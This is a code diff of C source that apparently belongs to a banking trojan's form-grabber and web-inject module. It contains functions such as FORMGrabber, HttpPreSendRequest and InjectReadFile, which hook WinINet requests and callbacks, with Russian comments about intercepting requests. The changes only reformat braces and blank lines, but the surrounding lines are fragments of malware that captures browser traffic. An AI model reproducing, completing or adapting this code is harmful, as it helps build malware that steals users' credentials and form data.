@@ -364,6 +364,7 @@ void WINAPI FORMGrabber(PRequest Request) {
 
 // ---------------------------------------------------------------------------
 
+
 PRequest HttpPreSendRequest(HINTERNET Handle, LPVOID Optional,
 	DWORD OptionalLength)
 {
@@ -371,6 +372,7 @@ PRequest HttpPreSendRequest(HINTERNET Handle, LPVOID Optional,
 	// Обрабатываем запрос
 	if (Handle == NULL)
 		return NULL;
+
 
 	// Обрабатываем только GET и POST методы
 	PCHAR Method = GetHTTPInfo(Handle, HTTP_QUERY_REQUEST_METHOD);
@@ -390,7 +392,6 @@ PRequest HttpPreSendRequest(HINTERNET Handle, LPVOID Optional,
 
 	Request->URL = GetInetOption(Handle, INTERNET_OPTION_URL);
 	Request->Method = MID;
-
 
 	IEDBG(Request, NULL, "Перехватываем запрос на %s", Request->URL);
 
@@ -639,7 +640,8 @@ void SetCallbackMethod(PRequest Request, INTERNET_STATUS_CALLBACK Method) {
 }
 // -----------------------------------------------------------------------------
 
-void RestoreCallbackMethod(PRequest Request) {
+void RestoreCallbackMethod(PRequest Request)
+{
 	// Восстанавливаем событие обратной связи
 	if (Request != NULL && Request->OldCallback != NULL) {
 		pInternetSetOptionA(Request->Owner, INTERNET_OPTION_CONTEXT_VALUE,
@@ -652,7 +654,8 @@ void RestoreCallbackMethod(PRequest Request) {
 }
 // -----------------------------------------------------------------------------
 
-void WaitCallbackEvent(PRequest Request) {
+void WaitCallbackEvent(PRequest Request)
+{
 	// Ожидаем события обратной связи
 	// Метод организовывает цикл обработки сообщений дл возникновения
 	// События Event
@@ -727,7 +730,8 @@ MemFree( picei );
 } */
 // -----------------------------------------------------------------------------
 
-DWORD WINAPI ReadDataProc(PRequest Request) {
+DWORD WINAPI ReadDataProc(PRequest Request)
+{
 	DWORD dwLastError = ERROR_SUCCESS;
 	int r = 1;
 
@@ -825,7 +829,8 @@ DWORD WINAPI ReadDataProc(PRequest Request) {
 
 int InjectReadFile(PRequest Request, LPVOID lpBuffer,
 	DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead,
-	DWORD_PTR dwContext) {
+	DWORD_PTR dwContext)
+{
 	// Функция загрузки файла
 	int r = 1;
 
